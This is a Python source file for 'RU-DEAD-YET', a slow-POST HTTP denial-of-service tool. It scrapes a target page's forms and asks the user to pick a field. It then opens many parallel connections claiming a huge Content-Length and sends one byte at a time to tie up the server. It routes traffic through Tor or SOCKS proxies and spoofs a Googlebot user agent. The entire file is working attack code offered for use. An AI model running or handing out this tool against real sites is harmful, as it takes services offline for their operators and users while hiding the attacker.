#!/usr/bin/env python3

# Standard library
import json
import random
import re
import socket
import sys
import time
from argparse import ArgumentParser, Namespace
from multiprocessing import Process
from typing import Any, Callable, Dict, List, Optional, Union
from urllib.parse import urlparse

# Third-party
import requests
import socks
from bs4 import BeautifulSoup

MAX_CONNECTIONS: int = 50
SLEEP_TIME: int = 10
PROXY_ADDRESS: str = "127.0.0.1"
PROXY_PORT: int = 9050  # default to TOR
DEFAULT_USER_AGENT: str = (
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
)


def form_to_dict(form: Any) -> Dict[str, Any]:
    """
    Convert a BeautifulSoup form tag into a dictionary describing the form.
    The type of `form` is left as Any to avoid importing bs4 types here.
    """
    form_dict: Dict[str, Any] = {
        "action": form.get("action", ""),
        "method": form.get("method", "post"),
        "id": form.get("id", ""),
        "class": form.get("class", ""),
        "inputs": [],
    }
    for index, input_field in enumerate(form.findAll("input")):
        form_dict["inputs"].append(
            {
                "id": input_field.get("id", ""),
                "class": input_field.get("class", ""),
                "name": input_field.get("name", ""),
                "value": input_field.get("value", ""),
                "type": input_field.get("type", ""),
            }
        )
    return form_dict


def get_forms(response: requests.Response) -> List[Dict[str, Any]]:
    """Extract forms from an HTTP response and return them as dicts."""
    soup = BeautifulSoup(response.text, "html.parser")
    forms: List[Dict[str, Any]] = []
    for form in soup.findAll("form"):
        forms.append(form_to_dict(form))
    return forms


def print_forms(forms: List[Dict[str, Any]]) -> None:
    """Print a numbered list of forms for user selection."""
    for index, form in enumerate(forms):
        print(
            "Form #%d --> id: %s --> class: %s --> action: %s"
            % (index, form["id"], form["class"], form["action"])
        )


def print_inputs(inputs: List[Dict[str, Any]]) -> None:
    """Print a numbered list of input fields for user selection."""
    for index, input_field in enumerate(inputs):
        print("Input #%d: %s" % (index, input_field["name"]))


def choose_form(response: requests.Response) -> Dict[str, Any]:
    """Prompt user to choose a form from the response."""
    forms = get_forms(response)
    return make_choice(
        print_forms, "Please select a form from the list above.", forms, "form"
    )


def choose_input(form: Dict[str, Any]) -> Dict[str, Any]:
    """Prompt user to choose an input field from the provided form dict."""
    return make_choice(
        print_inputs,
        "Please select a form field from the list above.",
        form["inputs"],
        "input",
    )


def make_choice(
    menu_function: Callable[[List[Any]], None],
    prompt: str,
    choices: List[Any],
    field: str,
) -> Any:
    """
    Generic menu/choice helper.
    `menu_function` prints choices when given the `choices` list.
    """
    while True:
        try:
            menu_function(choices)
            index = int(input("Enter %s number: " % field))
            return choices[index]
        except IndexError:
            print("That is not a valid choice.")
        except ValueError:
            print("That is not a valid choice.")
        print()


def craft_headers(
    path: str, host: str, user_agent: str, param: str, cookies: str
) -> str:
    """
    Build raw HTTP header block so we can send body byte by byte.
    """
    return "\n".join(
        [
            f"POST {path} HTTP/1.1",
            f"Host: {host}",
            "Connection: keep-alive",
            "Content-Length: 100000000",
            f"User-Agent: {user_agent}",
            f"Cookie: {cookies}",
            f"{param}=",
        ]
    )


def host_from_url(url: str) -> str:
    """Extract the host part from a URL using regex, matching original behavior."""
    p = r"(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*"
    m = re.search(p, url)
    if not m:
        raise ValueError("Unable to parse host from URL: %s" % url)
    return m.group("host")


def port_from_url(url: str) -> int:
    """Extract the port part from a URL or return 80 if not specified."""
    p = r"(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*"
    m = re.search(p, url)
    if not m:
        raise ValueError("Unable to parse port from URL: %s" % url)
    port = m.group("port")
    if port == "":
        return 80
    return int(port)


def select_session(configs: Dict[str, Any]) -> requests.Session:
    """
    Choose requests session implementation depending on whether proxies are present.
    Uses requests.Session with a socks proxy entry (socks5h) when proxies are configured.
    """
    session = requests.Session()
    if "proxies" in configs and configs["proxies"]:
        proxy = configs["proxies"][0]
        address = proxy["address"]
        port = proxy["port"]
        session.proxies = {
            "http": f"socks5h://{address}:{port}",
            "https": f"socks5h://{address}:{port}",
        }
    return session


def parse_args() -> Namespace:
    """Parse CLI arguments and return the Namespace."""
    parser = ArgumentParser()

    parser.add_argument(
        "--target",
        dest="target",
        type=str,
        required=True,
        help="Target url",
    )

    parser.add_argument(
        "--connections",
        dest="connections",
        type=int,
        required=False,
        default=MAX_CONNECTIONS,
        help="The number of connections to run simultaneously (default 50)",
    )

    parser.add_argument(
        "--user-agents",
        dest="user_agent_file",
        type=str,
        required=False,
        help="Load user agents from a local file OR from a URL returning JSON",
    )

    # nargs="*" produces a list (possibly empty) when the flag is present
    parser.add_argument(
        "--proxies",
        dest="proxy_file",
        type=str,
        nargs="*",
        required=False,
        help="Path(s) to proxy file(s) (one proxy per line: <address> <port>)",
    )

    parser.add_argument(
        "--sleep",
        dest="sleep_time",
        type=int,
        required=False,
        metavar="<seconds>",
        default=SLEEP_TIME,
        help="Wait <seconds> seconds before sending each byte.",
    )

    return parser.parse_args()


def _collect_strings_from_json(obj: Any) -> List[str]:
    """
    Recursively collect all string values found inside a JSON object.
    This is intentionally permissive: we'll collect any string and the caller
    can dedupe / filter later.
    """
    results: List[str] = []

    def scan(item: Any) -> None:
        if isinstance(item, str):
            results.append(item)
        elif isinstance(item, dict):
            for v in item.values():
                scan(v)
        elif isinstance(item, list):
            for v in item:
                scan(v)
        # else: ignore other types

    scan(obj)
    return results


def configure() -> Dict[str, Any]:
    """
    Configure runtime options by parsing args, loading files, selecting a form
    and preparing connection details.
    """
    args = parse_args()
    configs: Dict[str, Any] = {}

    # Handle proxies:
    # - If flag present with no args (args.proxy_file == []), use default TOR proxy.
    # - If one or more file paths provided (list of strings), read each file and parse proxies.
    if args.proxy_file is not None:
        if args.proxy_file == []:
            configs["proxies"] = [
                {"address": PROXY_ADDRESS, "port": PROXY_PORT},
            ]
        else:
            configs["proxies"] = []
            # args.proxy_file is a list of filenames
            for proxy_fname in args.proxy_file:
                try:
                    with open(proxy_fname) as fd:
                        for line in fd:
                            line = line.strip()
                            if not line:
                                continue
                            parts = line.split()
                            address = parts[0]
                            port = int(parts[1]) if len(parts) > 1 else PROXY_PORT
                            configs["proxies"].append(
                                {"address": address, "port": port}
                            )
                except FileNotFoundError:
                    print(f"[!] Proxy file not found: {proxy_fname}", file=sys.stderr)

    # -----------------------
    # User-agent loading logic
    # -----------------------
    configs["user_agents"] = [DEFAULT_USER_AGENT]
    if args.user_agent_file is not None:
        ua_source = args.user_agent_file.strip()
        if ua_source.startswith("http://") or ua_source.startswith("https://"):
            # treat as URL returning JSON; be tolerant about JSON shape
            try:
                print(f"[i] Fetching user-agent list from URL: {ua_source}")
                r = requests.get(ua_source, timeout=10)
                r.raise_for_status()
                try:
                    j = r.json()
                    strings = _collect_strings_from_json(j)
                    # Heuristic filter: only keep strings that look like typical UAs,
                    # but be permissive. Keep strings with at least one slash or token like 'Mozilla' or 'AppleWebKit'
                    filtered = []
                    for s in strings:
                        s = s.strip()
                        if not s:
                            continue
                        if (
                            "Mozilla" in s
                            or "AppleWebKit" in s
                            or "/" in s
                            or ("Windows" in s)
                            or ("Linux" in s)
                            or ("Android" in s)
                            or ("iPhone" in s)
                            or ("Chrome" in s)
                            or ("Safari" in s)
                        ):
                            filtered.append(s)
                    # if filter removed everything but we collected strings, fall back to all collected strings
                    if filtered:
                        configs["user_agents"] += list(dict.fromkeys(filtered))
                    else:
                        # fallback: if any strings at all, add them (deduped)
                        configs["user_agents"] += list(dict.fromkeys(strings))
                except ValueError:
                    # Not JSON — treat response as newline-separated user agents
                    for line in r.text.splitlines():
                        line = line.strip()
                        if line:
                            configs["user_agents"].append(line)
            except Exception as e:
                print(
                    f"[!] Failed to fetch user agents from URL {ua_source}: {e}",
                    file=sys.stderr,
                )
        else:
            # treat as local filename; same behavior as before
            try:
                with open(ua_source) as fd:
                    configs["user_agents"] += fd.read().splitlines()
            except FileNotFoundError:
                print(
                    f"[!] User agent file not found: {ua_source}",
                    file=sys.stderr,
                )

    # select form and target POST parameter, and set cookies
    session = select_session(configs)
    response = session.get(args.target)
    form = choose_form(response)
    configs["param"] = choose_input(form)["name"]
    configs["cookies"] = response.headers.get("set-cookie", "")

    # select target URL using selected form
    parsed_url = urlparse(args.target)
    if form["action"] != "":
        if form["action"].startswith("/"):
            configs["target"] = "http://%s%s" % (parsed_url.netloc, form["action"])
        else:
            # if action is absolute or relative without leading slash, prefer it directly
            configs["target"] = form["action"]
    else:
        configs["target"] = args.target

    # set path, HTTP host and port
    configs["path"] = parsed_url.path
    configs["host"] = host_from_url(configs["target"])
    configs["port"] = port_from_url(configs["target"])

    # set connections and sleep_time
    configs["connections"] = args.connections
    configs["sleep_time"] = args.sleep_time

    return configs


def launch_attack(i: int, configs: Dict[str, Any], headers: str) -> None:
    """
    Worker that establishes a (proxied or direct) TCP connection and sends the
    crafted header followed by periodic single-byte sends.
    """
    sock = None
    try:
        # establish initial connection to target
        print("[worker %d] Establishing connection" % i)

        # if we're using proxies, then we use socks.socksocket() instead of socket()
        if "proxies" in configs and configs["proxies"]:
            # select proxy
            proxy = random.choice(configs["proxies"])
            print(
                "[worker %d] Using socks proxy %s:%d"
                % (i, proxy["address"], proxy["port"])
            )

            # connect through proxy using PySocks API
            sock = socks.socksocket()
            # use the set_proxy method (PySocks) and ensure port is an int
            sock.set_proxy(socks.SOCKS5, proxy["address"], int(proxy["port"]))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock.connect((configs["host"], configs["port"]))

        print(
            "[worker %d] Successfully connected to %s"
            % (i, configs.get("target", "<unknown>"))
        )

        # start dos attack
        print("[worker %d] Beginning HTTP session... sending headers" % i)
        sock.send(headers.encode("utf-8"))
        while True:
            print("[worker %d] Sending one byte to target." % i)
            try:
                sock.send(b"\x41")
            except BrokenPipeError as e:
                print(
                    "[worker %d] Unable to send byte to target due to broken pipe."
                    % (i)
                )
            print("[worker %d] Sleeping for %d seconds" % (i, configs["sleep_time"]))
            time.sleep(configs["sleep_time"])
    except KeyboardInterrupt:
        pass
    finally:
        try:
            if sock:
                sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    print(
        """

                       ...
                     ;::::;
                   ;::::; :;
                 ;:::::'   :;
                ;:::::;     ;.
               ,:::::'       ;           OOO\\
               ::::::;       ;          OOOOO\\
               ;:::::;       ;         OOOOOOOO
              ,;::::::;     ;'         / OOOOOOO
            ;:::::::::`. ,,,;.        /  / DOOOOOO
          .';:::::::::::::::::;,     /  /     DOOOO
         ,::::::;::::::;;;;::::;,   /  /        DOOO
        ;`::::::`'::::::;;;::::: ,#/  /          DOOO
        :`:::::::`;::::::;;::: ;::#  /            DOOO
        ::`:::::::`;:::::::: ;::::# /              DOO
        `:`:::::::`;:::::: ;::::::#/               DOO
         :::`:::::::`;; ;:::::::::##                OO
         ::::`:::::::`;::::::::;:::#                OO
         `:::::`::::::::::::;'`:;::#                O
          `:::::`::::::::;' /  / `:#
           ::::::`:::::;'  /  /   `#


            RU-DEAD-YET
                .: Written by s0lst1c3
                .: Inspired by the original by Hybrid Security
    """
    )

    # set things up
    configs = configure()
    connections: List[Process] = []

    try:
        # spawn child processes to make connections
        for i in range(configs["connections"]):
            # craft header with random user agent for each connection
            headers = craft_headers(
                configs["path"],
                configs["host"],
                random.choice(configs["user_agents"]),
                configs["param"],
                configs["cookies"],
            )

            # launch attack as child process
            p = Process(target=launch_attack, args=(i, configs, headers))
            p.start()
            connections.append(p)

        # wait for all processes to finish or user interrupt
        for c in connections:
            c.join()

    except KeyboardInterrupt:
        # terminate all connections on user interrupt
        print("\n[!] Exiting on User Interrupt")
        for c in connections:
            c.terminate()
        for c in connections:
            c.join()
